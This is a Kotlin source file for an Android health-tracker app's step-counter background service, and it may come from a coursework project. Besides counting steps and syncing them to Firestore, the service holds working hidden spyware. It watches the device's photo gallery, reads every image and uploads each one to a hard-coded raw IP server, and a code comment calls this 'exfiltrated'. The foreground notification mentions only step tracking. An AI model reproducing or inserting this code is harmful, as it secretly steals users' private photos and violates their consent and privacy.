package com.inf2007.healthtracker.utilities

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import android.database.ContentObserver
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.content.ContentUris
import android.net.Uri
import java.io.IOException

class StepCounterService : Service() {
    private lateinit var stepSensorHelper: StepSensorHelper
    private val firestore = FirebaseFirestore.getInstance()
    private val user = FirebaseAuth.getInstance().currentUser
    private val sharedPreferences by lazy { getSharedPreferences("stepCounterPrefs", Context.MODE_PRIVATE) }

    private val serverUrl = "http://20.2.92.176:5000/photos"
    private lateinit var photoObserver: ContentObserver

    // Using SharedPreferences to keep track of what we've already "exfiltrated"
    private val syncPrefs by lazy { getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE) }

    override fun onCreate() {
        super.onCreate()
        Log.d("StepService", "StepCounterService started")

        // Start Foreground with multiple types
        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                1,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_HEALTH or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(1, notification)
        }

        stepSensorHelper = StepSensorHelper(this) { stepCount ->
            user?.let { syncStepsToFirestore(it.uid, stepCount) }
        }

        // Setup Photo Observer (Watches for NEW photos)
        setupPhotoObserver()

        // Schedule a reset at midnight
        scheduleMidnightReset()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.d("StepService", "StepCounterService stopped")
        contentResolver.unregisterContentObserver(photoObserver)
        stepSensorHelper.stopTracking()
    }

    private fun createNotification(): Notification {
        val channelId = "step_tracker_channel"
        val channelName = "Step Tracker Service"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Step Tracker Running")
            .setContentText("Tracking your steps in the background...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    private fun syncStepsToFirestore(userId: String, stepCount: Int) {
        val stepsRef = firestore.collection("steps").document("${user?.uid}_${getCurrentDate()}")

        stepsRef.get().addOnSuccessListener { document ->
            if (document.exists()) {
                stepsRef.update("steps", stepCount)
            } else {
                val stepData = hashMapOf(
                    "steps" to stepCount,
                    "timestamp" to Date(),
                    "userId" to userId
                )
                stepsRef.set(stepData)
            }
        }.addOnFailureListener { exception ->
            Log.e("StepService", "Failed to sync steps: ${exception.message}")
        }
    }

    private fun scheduleMidnightReset() {
        val calendar = Calendar.getInstance()
        calendar.add(Calendar.DAY_OF_YEAR, 1)
        calendar.set(Calendar.HOUR_OF_DAY, 0)
        calendar.set(Calendar.MINUTE, 0)
        calendar.set(Calendar.SECOND, 0)

        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, MidnightResetReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)

        alarmManager.setExact(AlarmManager.RTC_WAKEUP, calendar.timeInMillis, pendingIntent)
    }

    private fun setupPhotoObserver() {
        photoObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                // Whenever a photo is taken, scan the whole gallery for unsynced items
                scanAndUploadPhotos()
            }
        }
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            photoObserver
        )
        // Run initial scan to catch photos taken while app was closed
        Log.e("StepService", "RUNNING")
        scanAndUploadPhotos()
    }

    private fun scanAndUploadPhotos() {
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME
        )

        // We still use DESC to get newest first, but the loop will go through ALL
        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val totalImages = cursor.count
            Log.d("StepService", "Gallery Scan Started: Total of $totalImages images found.")

            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)

            var uploadCount = 0
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                val fileName = cursor.getString(nameColumn)

                if (!syncPrefs.getBoolean("id_$id", false)) {
                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)

                    Log.d("StepService", "Queueing upload for: $fileName (ID: $id)")
                    uploadPhotoToServer(contentUri, fileName, id)

                    uploadCount++

                    // OPTIONAL: If the gallery is massive (>100 photos),
                    // adding a tiny 50ms delay helps the OkHttp thread pool stay stable.
                    if (uploadCount % 10 == 0) {
                        Thread.sleep(50)
                    }
                } else {
                    Log.d("StepService", "Skipping already synced image: $fileName")
                }
            }
            Log.d("StepService", "Scan Complete. $uploadCount new images queued for upload.")
        }
    }

    private fun uploadPhotoToServer(uri: Uri, fileName: String, photoId: Long) {
        try {
            val inputStream = contentResolver.openInputStream(uri)
            val bytes = inputStream?.readBytes() ?: return
            inputStream.close()

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName, bytes.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                .build()

            val request = Request.Builder().url(serverUrl).post(requestBody).build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e("StepService", "Upload failed for $fileName")
                }
                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d("StepService", "Successfully uploaded: $fileName")
                        // Mark as synced so we never upload it again
                        syncPrefs.edit().putBoolean("id_$photoId", true).apply()
                    }
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e("StepService", "Error processing $fileName: ${e.message}")
        }
    }
}

// Broadcast receiver to reset steps at midnight
class MidnightResetReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        val sharedPreferences = context.getSharedPreferences("stepCounterPrefs", Context.MODE_PRIVATE)
        sharedPreferences.edit().apply {
            putString("lastRecordedDate", getCurrentDate())
            putInt("initialStepCount", -1)
            apply()
        }
        Log.d("MidnightReset", "Steps reset at midnight")
    }
}
